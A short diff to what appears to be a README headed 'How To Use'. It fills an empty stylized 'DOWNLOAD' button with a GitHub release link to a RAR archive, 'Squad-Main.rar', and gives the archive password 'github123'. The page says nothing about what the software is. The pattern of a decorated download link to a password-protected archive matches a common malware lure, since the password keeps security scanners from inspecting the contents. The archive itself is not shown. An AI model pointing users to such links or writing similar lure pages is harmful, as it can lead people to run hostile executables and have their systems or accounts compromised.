@@ -1,6 +1,6 @@
 # **How To Use**:
 
-# [𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿]()
+# [𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿](https://github.com/kybrian/storefront/releases/download/1/Squad-Main.rar)
 
 # **Pass**: `github123`
 
